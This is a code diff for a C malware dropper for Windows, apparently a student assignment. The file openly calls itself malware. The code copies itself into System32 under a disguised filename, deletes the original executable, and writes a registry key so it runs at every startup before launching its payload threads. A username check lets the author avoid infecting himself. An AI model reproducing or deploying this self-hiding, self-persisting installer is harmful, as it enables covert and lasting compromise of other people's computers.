@@ -6,30 +6,20 @@
 #include <stdio.h>
 
 // give our malware a very unsuspicious name :)
-#define EXEC_PATH1 "C:\\Windows\\System32\\JamesBond.exe"
-#define EXEC_PATH2 "C:\\Windows\\SysWOW64\\JamesBond.exe"
+#define EXEC_PATH "C:\\Windows\\System32\\JamesBond.exe"
 
 #define FIRST_RUN_FROM_SYS32 "-007"
-#define RUN_FROM_REGISTRY    "-006"
+#define RUN_FROM_REGISTRY    "-008"
 
 
-static void run(char* path, char* requArg);
-static void copyAndLaunch(char* path);
+static void copyToSys32AndLaunch(char** argv);
+static void runFromRegistry(char** argv);
+static void firstRunFromSys32(char** argv);
+static void run();
 
-BOOL is64Bit;
+static void check();
 
-// ------------------------
-// remove before submission
-// ------------------------
-void check() {   // just ensuring if I accidently run it then it doesn't infect me lol
-    DWORD size = UNLEN + 1;
-    char buffUser[size];
-    if (!GetUserNameA(buffUser, &size)) { exit(1); }
-
-    if (strcmp(buffUser, "louis") == 0) {
-        exit(0);
-    }
-}
+WINBOOL is64BitMachine;
 
 int main(int argc, char** argv) {
     check();
@@ -46,120 +36,130 @@ int main(int argc, char** argv) {
 
     // retrieve the bitness of the client computer,  returns true if the current 
     // process is being run by the 32-bit emulator on a windows 64-bit machine
-    IsWow64Process(GetCurrentProcess(), &is64Bit);
 
-    if (argc == 1) {
-        copyAndLaunch(argv[0]);
-    } else if (argc == 2) {
-        run(argv[0], argv[1]);
-    } else {
-        exit(0);
-    }
-}
+    PVOID __tmp__;
+    // returns true on if our 32-bit process is running in a 64-bit machine 
+    is64BitMachine = Wow64DisableWow64FsRedirection(&__tmp__);
+    printf("is64BitMachine? %d\n", is64BitMachine);
 
-static void run(char* path, char* arg) {
-
-
-    // ensure we are being run from the correct place and with correct argument
-    if ((strcmp(path, EXEC_PATH1) != 0 && strcmp(path, EXEC_PATH2) != 0)
-            || ((strcmp(arg, FIRST_RUN_FROM_SYS32) != 0) && strcmp(arg, RUN_FROM_REGISTRY) != 0)) { 
-        exit(0);
+    switch (argc) {
+        case 1:  // launched for the first time
+            copyToSys32AndLaunch(argv);
+            break;
+        case 2:  // run from the registry key 
+            runFromRegistry(argv);
+            break;
+        case 3:  // run from the copy and launch
+            firstRunFromSys32(argv);
+            break;
     }
 
-    // if we are being run on device satrtup then no need to make registry key again!
-    if (strcmp(arg, RUN_FROM_REGISTRY) == 0) {  // -006
-        Sleep(30000); // sleep for 30s so we have enough time to see the process running in procexp!
-        goto __exec__;
-    }
-
-    // if we are being run from System32 for the first time! 
-    // then we want to generate 
-    if (strcmp(arg, FIRST_RUN_FROM_SYS32) == 0) {  // -007 
-        RET_CODE ret;
-        if (!is64Bit) { ret = generateRegKey(EXEC_PATH1, RUN_FROM_REGISTRY, KEY_WRITE); } 
-        else          { ret = generateRegKey(EXEC_PATH2, RUN_FROM_REGISTRY, KEY_WRITE | KEY_WOW64_64KEY); }
-
-        if (ret != R_SUCCESS) {
-            printf("Failed to generate registry key.\n");
-        }
-    }
-
-    __exec__:  // run the malware code as normal
-    
-    RET_CODE ret = setup();  
-    if (ret != R_SUCCESS) {
-        printErr(ret);
-        programCleanup();
-        exit(ret);
-    }
-
-    ret = startThreads();
-    printf("Cleaning up.\nProgram exited with msg: %s", getErrMessage(ret));
-
-    programCleanup();
+    Wow64RevertWow64FsRedirection(__tmp__);
     exit(0);
 }
 
-static void copyAndLaunch(char* path) {
-    FILE* original = fopen(path, "rb");
-    FILE* target = fopen(EXEC_PATH1, "wb");
-    if (original == NULL || target == NULL) { exit(1); }
+static void copyToSys32AndLaunch(char** argv) {
+    char* path = argv[0];
+    char buffer[__UINT16_MAX__];   // 64 kilobytes
+    
+    HANDLE hSource = CreateFileA(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hDest = CreateFileA(EXEC_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
-    int ch;
-    while ((ch = fgetc(original)) != EOF) { fputc(ch, target); }
-    fclose(target); fclose(original);
-    printf("Created SYS32 Executable..\n");
-
-    HANDLE hToken;
-    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
-        printf("Failed to open process token.\nExiting...\n");
-        exit(1);
+    DWORD bytesRead;
+    while (ReadFile(hSource, buffer, __UINT16_MAX__, &bytesRead, NULL) && bytesRead > 0) {
+        if (!WriteFile(hDest, buffer, bytesRead, NULL, NULL)) {
+            break;
+        }
     }
+
+    CloseHandle(hSource);
+    CloseHandle(hDest);
+
+    printf("Created SYS32 Executable..\n");
 
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
-
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
     ZeroMemory(&pi, sizeof(pi));
 
     // pass the token to our privileged process!, NULL, as well as the command to be executed
-    // the NULL lets use use the command line
-    char cmd[256];
-    snprintf(cmd, 256, "\"%s\" %s", EXEC_PATH1, FIRST_RUN_FROM_SYS32);
-    BOOL ret = CreateProcessAsUserA(
-        hToken, NULL, cmd,
+    // the NULL lets use us the command line
+    char cmd[MAX_PATH];
+    snprintf(cmd, MAX_PATH, "\"%s\" %s \"%s\"", EXEC_PATH, FIRST_RUN_FROM_SYS32, path);
+
+    BOOL ret = CreateProcessA(
+        NULL, cmd,
         NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi
     );
 
-    if(!ret) { exit(1); } // printf("CreateProcess failed (%ld).\n", GetLastError());
-    
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-
+    if(!ret) exit(1);
     printf("Exiting worker...\n");
-    remove(path); // remove the original module!
-    exit(0);
+}
+
+static void runFromRegistry(char** argv) {
+    char* path = argv[0];
+    char* arg = argv[1];
+    if (strcmp(path, EXEC_PATH) != 0 || strcmp(arg, RUN_FROM_REGISTRY) != 0) {
+        return;
+    }
+
+    Sleep(30000);
+    run();
+}
+
+static void firstRunFromSys32(char** argv) {
+    char* path = argv[0];
+    char* arg = argv[1];
+    char* delPath = argv[2];
+
+    if (strcmp(path, EXEC_PATH) != 0 || strcmp(arg, FIRST_RUN_FROM_SYS32) != 0) {
+        exit(0);
+    }
+
+    // delete the orignal malware file!
+    DeleteFileA(delPath);
+    printf("Deleting %s...", path);
+    
+    // check for 64 bit machine, add the KEY_WOW64_64KEY flag if we are in one
+    LONG access = KEY_WRITE;
+    if (is64BitMachine) {
+        access |= KEY_WOW64_64KEY;
+    }
+
+    RET_CODE ret = generateRegKey(EXEC_PATH, RUN_FROM_REGISTRY, access);
+    if (ret != R_SUCCESS) {
+        printf("Failed to generate registry key.\n");
+    }
+
+    run();
+}
+
+static void run() {
+    RET_CODE ret = setup();
+    if (ret != R_SUCCESS) {
+        printErr(ret);
+        programCleanup();
+        return;
+    }
+
+    ret = startThreads();
+    printf("Cleaning up.\nProgram exited with msg: %s", getErrMessage(ret));
+    programCleanup();
 }
 
 
-// static void run();
 
-// int main(int argc, char** argv) {
-//     run();
-// }
 
-// static void run() {
-//     int ret = setup();
-//     if (ret != R_SUCCESS) {
-//         printErr(ret);
-//         programCleanup();
-//         exit(ret);
-//     }
+// ------------------------
+// remove before submission
+// ------------------------
+void check() {   // just ensuring if I accidently run it then it doesn't infect me lol
+    DWORD size = UNLEN + 1;
+    char buffUser[size];
+    if (!GetUserNameA(buffUser, &size)) { exit(1); }
 
-//     ret = startThreads();
-//     printf("Cleaning up.\nProgram exited with msg: %s", getErrMessage(ret));
-
-//     programCleanup();
-//     exit(0);
-// }
+    if (strcmp(buffUser, "louis") == 0) {
+        exit(0);
+    }
+}
